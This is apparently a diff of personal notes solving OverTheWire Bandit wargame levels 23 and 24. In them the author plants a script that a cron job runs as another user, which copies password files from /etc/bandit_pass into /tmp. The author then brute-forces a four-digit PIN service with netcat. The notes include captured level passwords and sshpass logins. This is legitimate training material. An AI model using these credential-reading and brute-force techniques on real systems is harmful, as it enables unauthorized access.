@@ -484,14 +484,102 @@ QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 
 #+begin_src bash :results output verbatim
 sshpass -p QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G ssh bandit23@bandit.labs.overthewire.org -p 2220 <<EOF
-ls -la
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+ls -la /var/spool/bandit24
+cat > /var/spool/bandit24/foo/alvaro.sh <<INNER
+cat /etc/bandit_pass/bandit24 > /tmp/alvaro.sh.out 2&>1
+cat /etc/bandit_pass/bandit23 >> /tmp/alvaro.sh.out 2&>1
+cat /etc/bandit_pass/bandit25 >> /tmp/alvaro.sh.out 2&>1
+cat el intento de las \$(date)
+INNER
+chmod +x /var/spool/bandit24/foo/alvaro.sh
 EOF
 #+end_src
 
 #+RESULTS:
-: total 20
-: drwxr-xr-x  2 root root 4096 Jan 11 19:18 .
-: drwxr-xr-x 70 root root 4096 Jan 11 19:19 ..
-: -rw-r--r--  1 root root  220 Jan  6  2022 .bash_logout
-: -rw-r--r--  1 root root 3771 Jan  6  2022 .bashrc
-: -rw-r--r--  1 root root  807 Jan  6  2022 .profile
+#+begin_example
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+,* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+total 12
+dr-xr-x--- 3 bandit24 bandit23 4096 Jan 11 19:18 .
+drwxr-xr-x 5 root     root     4096 Jan 11 19:18 ..
+drwxrwx-wx 7 root     bandit24 4096 Feb 15 18:02 foo
+total 136
+-r-------- 1 bandit0  bandit0   8 Jan 11 19:18 bandit0
+-r-------- 1 bandit1  bandit1  33 Jan 11 19:18 bandit1
+-r-------- 1 bandit10 bandit10 33 Jan 11 19:18 bandit10
+-r-------- 1 bandit11 bandit11 33 Jan 11 19:18 bandit11
+-r-------- 1 bandit12 bandit12 33 Jan 11 19:18 bandit12
+-r-------- 1 bandit13 bandit13 33 Jan 11 19:18 bandit13
+-r-------- 1 bandit14 bandit14 33 Jan 11 19:18 bandit14
+-r-------- 1 bandit15 bandit15 33 Jan 11 19:18 bandit15
+-r-------- 1 bandit16 bandit16 33 Jan 11 19:18 bandit16
+-r-------- 1 bandit17 bandit17 33 Jan 11 19:18 bandit17
+-r-------- 1 bandit18 bandit18 33 Jan 11 19:18 bandit18
+-r-------- 1 bandit19 bandit19 33 Jan 11 19:18 bandit19
+-r-------- 1 bandit2  bandit2  33 Jan 11 19:18 bandit2
+-r-------- 1 bandit20 bandit20 33 Jan 11 19:18 bandit20
+-r-------- 1 bandit21 bandit21 33 Jan 11 19:18 bandit21
+-r-------- 1 bandit22 bandit22 33 Jan 11 19:18 bandit22
+-r-------- 1 bandit23 bandit23 33 Jan 11 19:18 bandit23
+-r-------- 1 bandit24 bandit24 33 Jan 11 19:18 bandit24
+-r-------- 1 bandit25 bandit25 33 Jan 11 19:18 bandit25
+-r-------- 1 bandit26 bandit26 33 Jan 11 19:18 bandit26
+-r-------- 1 bandit27 bandit27 33 Jan 11 19:18 bandit27
+-r-------- 1 bandit28 bandit28 33 Jan 11 19:18 bandit28
+-r-------- 1 bandit29 bandit29 33 Jan 11 19:18 bandit29
+-r-------- 1 bandit3  bandit3  33 Jan 11 19:18 bandit3
+-r-------- 1 bandit30 bandit30 33 Jan 11 19:18 bandit30
+-r-------- 1 bandit31 bandit31 33 Jan 11 19:18 bandit31
+-r-------- 1 bandit32 bandit32 33 Jan 11 19:18 bandit32
+-r-------- 1 bandit33 bandit33 33 Jan 11 19:18 bandit33
+-r-------- 1 bandit4  bandit4  33 Jan 11 19:18 bandit4
+-r-------- 1 bandit5  bandit5  33 Jan 11 19:18 bandit5
+-r-------- 1 bandit6  bandit6  33 Jan 11 19:18 bandit6
+-r-------- 1 bandit7  bandit7  33 Jan 11 19:18 bandit7
+-r-------- 1 bandit8  bandit8  33 Jan 11 19:18 bandit8
+-r-------- 1 bandit9  bandit9  33 Jan 11 19:18 bandit9
+
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+#+end_example
+
+* Level 24
+
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+#+begin_src bash :results output verbatim
+sshpass -p VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ssh bandit24@bandit.labs.overthewire.org -p 2220 <<EOF
+for I in \$(seq 0 9999)
+do
+   printf "%s %04d\n" VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar \$I 
+done | nc localhost 30002 | grep -v Wrong
+EOF
+#+end_src
+
+#+RESULTS:
+: I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+: Correct!
+: The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+: 
+: Exiting.
